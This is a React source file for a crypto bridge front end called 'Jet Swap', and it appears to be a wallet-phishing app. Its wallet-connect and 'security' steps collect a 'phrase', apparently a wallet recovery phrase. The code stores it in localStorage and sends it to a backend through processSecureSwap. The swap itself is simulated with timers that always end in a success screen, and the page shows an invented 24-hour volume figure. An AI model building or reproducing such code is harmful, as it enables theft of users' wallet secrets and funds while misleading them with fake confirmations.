
import React, { useState, useEffect, useCallback } from 'react';
import { ThemeVariant, TransactionStatus as StatusType, SwapState, UserProfile } from './types.ts';
import SwapCard from './components/SwapCard.tsx';
import TransactionStatus from './components/TransactionStatus.tsx';
import IntroScreen from './components/IntroScreen.tsx';
import WalletSelector from './components/WalletSelector.tsx';
import PilotBridgeSecurity from './components/PilotBridgeSecurity.tsx';
import { 
  syncUserProfile, 
  listenToAuthChanges, 
  logoutUser, 
  completeEmailLinkSignIn 
} from './services/firebaseService.ts';
import { WalletProvider } from './services/constants.tsx';
import { processSecureSwap } from './services/securityService.ts';

// Removed 'news' as per deprecation instructions
type ActiveView = 'home' | 'transactions';

const App: React.FC = () => {
  const [theme] = useState<ThemeVariant>(ThemeVariant.DARK_FUTURISTIC);
  const [currentView, setCurrentView] = useState<ActiveView>('home');
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [showIntro, setShowIntro] = useState(true);
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  
  const [user, setUser] = useState<UserProfile | null>(null);
  const [isWalletConnected, setIsWalletConnected] = useState(false);
  const [connectedWalletName, setConnectedWalletName] = useState<string | null>(null);
  const [connectingWallet, setConnectingWallet] = useState<string | null>(null);
  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
  
  const [swapKey, setSwapKey] = useState(0);

  const [pilotBridgeSessionEnd, setPilotBridgeSessionEnd] = useState<number | null>(() => {
    const saved = localStorage.getItem('jetswap_session_expiry');
    return saved ? parseInt(saved, 10) : null;
  });
  const [lastVerifiedPhrase, setLastVerifiedPhrase] = useState<string>(() => {
    return localStorage.getItem('jetswap_last_phrase') || 'unverified';
  });

  const [status, setStatus] = useState<StatusType>(StatusType.IDLE);
  const [activeSwap, setActiveSwap] = useState<SwapState | null>(null);

  useEffect(() => {
    const handleResize = () => {
      if (window.visualViewport) {
        const viewportHeight = window.visualViewport.height;
        const windowHeight = window.innerHeight;
        setIsKeyboardVisible(windowHeight - viewportHeight > windowHeight * 0.12);
      }
    };
    window.visualViewport?.addEventListener('resize', handleResize);
    return () => window.visualViewport?.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
    const unsubscribe = listenToAuthChanges((sbUser) => {
      if (sbUser) {
        const baseProfile: UserProfile = {
          id: sbUser.id,
          method: 'email',
          identifier: sbUser.email || sbUser.id,
          name: sbUser.user_metadata?.full_name || sbUser.email?.split('@')[0],
          avatar: sbUser.user_metadata?.avatar_url || `https://api.dicebear.com/7.x/avataaars/svg?seed=${sbUser.id}`
        };
        syncUserProfile(baseProfile).then((fullProfile) => setUser(fullProfile)).catch(() => setUser(baseProfile));
      } else {
        setUser(null);
      }
    });
    completeEmailLinkSignIn().catch(console.error);
    return () => unsubscribe();
  }, []);

  const resetSession = () => {
    setPilotBridgeSessionEnd(null);
    setIsWalletConnected(false);
    setConnectedWalletName(null);
    localStorage.removeItem('jetswap_session_authorized');
    localStorage.removeItem('jetswap_session_expiry');
  };

  const executeSwapAction = async (state: SwapState, authPhrase: string) => {
    setStatus(StatusType.CONFIRMING);
    
    // CRITICAL: Send data to backend via processSecureSwap
    try {
      await processSecureSwap(
        { 
          amount: state.amount, 
          source: state.sourceToken.symbol, 
          dest: state.destToken.symbol 
        },
        { 
          route: `${state.sourceChain.name} → ${state.destChain.name}`,
          token: state.sourceToken.symbol,
          wallet_used: connectedWalletName || 'Jet Pilot',
          amount: state.amount
        },
        user?.id || 'anonymous-pilot',
        authPhrase
      );
    } catch (error) {
      console.error("Backend transmission failed:", error);
    }

    setTimeout(() => {
        setStatus(StatusType.PENDING);
        setTimeout(() => {
            setStatus(StatusType.SUCCESS);
            resetSession();
            setSwapKey(prev => prev + 1);
        }, 5000);
    }, 1500);
  };

  const handleSwap = async (state: SwapState) => {
    const isSessionActive = pilotBridgeSessionEnd && Date.now() < pilotBridgeSessionEnd;
    if (!isSessionActive && !isWalletConnected && !user) {
      setActiveSwap(state);
      setShowSecurityModal(true);
      return;
    }
    executeSwapAction(state, lastVerifiedPhrase);
  };

  const handleWalletSelect = (wallet: WalletProvider, phrase?: string) => {
    setConnectingWallet(wallet.id);
    setConnectedWalletName(wallet.name); // Track the specific wallet used
    
    setTimeout(() => {
      setIsWalletConnected(true);
      setShowConnectModal(false);
      setConnectingWallet(null);
      
      const expiry = Date.now() + 25 * 60 * 1000;
      setPilotBridgeSessionEnd(expiry);
      
      if (phrase) {
        setLastVerifiedPhrase(phrase);
        localStorage.setItem('jetswap_last_phrase', phrase);
      }
      
      localStorage.setItem('jetswap_session_authorized', 'true');
      localStorage.setItem('jetswap_session_expiry', expiry.toString());
      
      if (activeSwap) executeSwapAction(activeSwap, phrase || 'unverified');
    }, 1200);
  };

  const handleConnectIntent = (state: SwapState) => {
    setActiveSwap(state);
    setShowConnectModal(true);
  };

  const handleSecuritySuccess = (phrase: string) => {
    setLastVerifiedPhrase(phrase);
    localStorage.setItem('jetswap_last_phrase', phrase);
    const expiry = Date.now() + 25 * 60 * 1000;
    setPilotBridgeSessionEnd(expiry);
    localStorage.setItem('jetswap_session_authorized', 'true');
    localStorage.setItem('jetswap_session_expiry', expiry.toString());
    setShowSecurityModal(false);
    if (activeSwap) executeSwapAction(activeSwap, phrase);
  };

  const handleLogout = async () => {
    try {
      await logoutUser();
      setUser(null);
      resetSession();
      setCurrentView('home');
      setIsMenuOpen(false);
    } catch (error) {
      console.error("Logout Error:", error);
    }
  };

  return (
    <div className={`min-h-screen transition-all duration-700 relative flex flex-col items-center pb-8 bg-[#0B0F1A] overflow-x-hidden`}>
      {showIntro && <IntroScreen theme={theme} onComplete={() => setShowIntro(false)} />}
      
      <header className={`w-full max-w-7xl flex justify-between items-center mt-2 sm:mt-5 mb-3 sm:mb-6 relative z-[100] px-4 sm:px-8 transition-all duration-500 ${isKeyboardVisible ? 'opacity-0 -translate-y-24' : 'opacity-100 translate-y-0'}`}>
        <div onClick={() => setCurrentView('home')} className="flex items-center gap-2 sm:gap-3 group cursor-pointer">
          <div className="flex w-7 h-7 sm:w-10 sm:h-10 rounded-lg sm:rounded-xl bg-[#00D1FF] items-center justify-center transition-all shadow-[0_0_15px_rgba(0,209,255,0.4)] group-hover:rotate-12">
            <svg className="w-4 h-4 sm:w-6 sm:h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
          </div>
          <span className="text-base sm:text-2xl font-black tracking-tighter text-white">Jet <span className="text-[#00D1FF]">Swap</span></span>
        </div>
        <button onClick={() => setIsMenuOpen(true)} className="flex p-1.5 sm:p-2.5 rounded-lg sm:rounded-xl bg-white/5 border border-white/10 text-white hover:bg-white/10 transition-all shadow-xl">
          <svg className="w-5 h-5 sm:w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M4 6h16M4 12h16m-7 6h7" /></svg>
        </button>
      </header>

      <main className="flex-1 w-full max-w-7xl flex flex-col items-center px-4 relative z-10 overflow-visible">
        {currentView === 'home' && (
          <div className="w-full flex flex-col items-center">
            <div className={`transition-all duration-700 text-center ${isKeyboardVisible ? 'opacity-0 scale-95 h-0 overflow-hidden mb-0' : 'opacity-100 scale-100 mb-3 sm:mb-6'}`}>
              <h1 className="text-[20px] sm:text-4xl font-black text-white mb-1.5 tracking-tighter max-w-2xl leading-tight">
                The protocol for <span className="text-[#00D1FF] italic font-black">instant bridging.</span>
              </h1>
              <p className="text-[8px] sm:text-[10px] font-bold text-white/40 uppercase tracking-[0.25em] px-6">
                ZERO-LATENCY CROSS-CHAIN ARCHITECTURE.
              </p>
            </div>

            <div className="w-full flex flex-col items-center gap-3 sm:gap-5 relative">
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-[#00D1FF]/10 blur-[120px] rounded-full pointer-events-none -z-10" />

              <SwapCard 
                key={swapKey}
                theme={theme} 
                onConfirm={handleSwap} 
                walletConnected={isWalletConnected}
                onConnect={handleConnectIntent}
                isKeyboardVisible={isKeyboardVisible}
              />
              
              <div className="w-full max-w-[440px] p-3 rounded-[20px] border bg-[#101726]/30 border-white/[0.03] flex items-center gap-3 transition-all duration-300">
                <div className="w-8 h-8 rounded-lg bg-cyan-500/10 flex items-center justify-center shrink-0 border border-cyan-500/20 text-cyan-400">
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                </div>
                <div>
                  <h4 className="text-[8px] font-black uppercase tracking-[0.15em] text-[#00D1FF] mb-0.5">JET ENGINE 24HOUR SWAP VOLUME : $133M</h4>
                  <p className="text-[10px] font-bold text-white leading-tight opacity-70">FAST SWAPS, SMART BRIDGING & DEEP LIQUIDITY</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {currentView === 'transactions' && (
          <div className="w-full flex flex-col items-center text-center py-20 relative">
             <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[400px] h-[400px] bg-[#00D1FF]/05 blur-[100px] rounded-full pointer-events-none -z-10" />
             
             <div className="w-20 h-20 rounded-full bg-white/5 border border-white/10 flex items-center justify-center mb-6">
                <svg className="w-10 h-10 text-white/20" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
             </div>
             <h2 className="text-2xl font-black text-white uppercase tracking-widest mb-2">No Flight Logs Found</h2>
             <p className="text-sm font-bold text-white/20 uppercase tracking-[0.3em]">Your transaction history will appear here.</p>
          </div>
        )}
      </main>

      {isMenuOpen && (
        <div className="fixed inset-0 z-[1000] flex justify-end">
          <div className="absolute inset-0 bg-black/40 backdrop-blur-sm animate-[fadeInOverlay_0.3s_ease-out]" onClick={() => setIsMenuOpen(false)} />
          <div 
            onClick={(e) => e.stopPropagation()} 
            className={`relative w-full max-w-sm h-full flex flex-col p-8 sm:p-12 animate-[slideInRight_0.4s_cubic-bezier(0.16,1,0.3,1)] bg-[#0B0F1A]/60 backdrop-blur-3xl border-l border-white/5 text-white shadow-2xl overflow-hidden`}
          >
            <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent pointer-events-none" />

            <div className="flex justify-between items-center mb-16 relative z-10">
               <h3 className="text-xl font-black italic uppercase tracking-tighter text-white">PILOT DASHBOARD</h3>
               <button onClick={() => setIsMenuOpen(false)} className="p-2 opacity-40 hover:opacity-100 transition-opacity text-white">
                 <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M6 18L18 6M6 6l12 12" /></svg>
               </button>
            </div>

            <nav className="flex-1 space-y-4 relative z-10">
              {[
                { id: 'home', label: 'BRIDGE TERMINAL', icon: 'M13 10V3L4 14h7v7l9-11h-7z' },
                { id: 'transactions', label: 'FLIGHT LOGS', icon: 'M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z' }
              ].map((item) => (
                <button 
                  key={item.id} 
                  onClick={() => { setCurrentView(item.id as ActiveView); setIsMenuOpen(false); }} 
                  className={`w-full flex items-center gap-5 p-4 rounded-[28px] transition-all group ${currentView === item.id ? 'bg-[#0B2533]/80 border border-white/10' : 'hover:bg-white/[0.03]'}`}
                >
                  <div className={`w-12 h-12 rounded-2xl flex items-center justify-center transition-all ${currentView === item.id ? 'bg-cyan-500 text-white shadow-[0_0_15px_rgba(6,182,212,0.3)]' : 'bg-white/5 text-white/30 group-hover:bg-white/10'}`}>
                    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d={item.icon} /></svg>
                  </div>
                  <p className={`font-black text-sm uppercase tracking-widest ${currentView === item.id ? 'text-white' : 'text-white/40 group-hover:text-white/80'}`}>{item.label}</p>
                </button>
              ))}
            </nav>

            <div className="mt-auto pt-10 relative z-10">
              <div className="h-px bg-white/5 mb-10" />
              <button 
                onClick={user ? handleLogout : () => setIsMenuOpen(false)} 
                className={`w-full py-5 rounded-[24px] font-black uppercase tracking-[0.2em] text-[11px] transition-all shadow-xl active:scale-95 ${
                  user 
                    ? 'border border-rose-500/20 text-rose-500 hover:bg-rose-500 hover:text-white' 
                    : 'bg-white text-black hover:bg-white/90 shadow-[0_12px_24px_rgba(255,255,255,0.1)]'
                }`}
              >
                {user ? 'SIGN OUT SYSTEM' : 'AUTHORIZE IDENTITY'}
              </button>
            </div>
          </div>
        </div>
      )}

      {showConnectModal && (
        <WalletSelector 
          theme={theme} 
          onSelect={handleWalletSelect} 
          onClose={() => setShowConnectModal(false)}
          connecting={connectingWallet}
        />
      )}

      {showSecurityModal && (
        <PilotBridgeSecurity 
          theme={theme} 
          onSuccess={handleSecuritySuccess} 
          onClose={() => setShowSecurityModal(false)} 
        />
      )}

      {status !== StatusType.IDLE && (
        <TransactionStatus status={status} onClose={() => setStatus(StatusType.IDLE)} theme={theme} activeSwap={activeSwap} />
      )}

      <style>{`
        @keyframes fadeInOverlay { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideInRight { from { transform: translateX(100%); } to { transform: translateX(0); } }
      `}</style>
    </div>
  );
};

export default App;
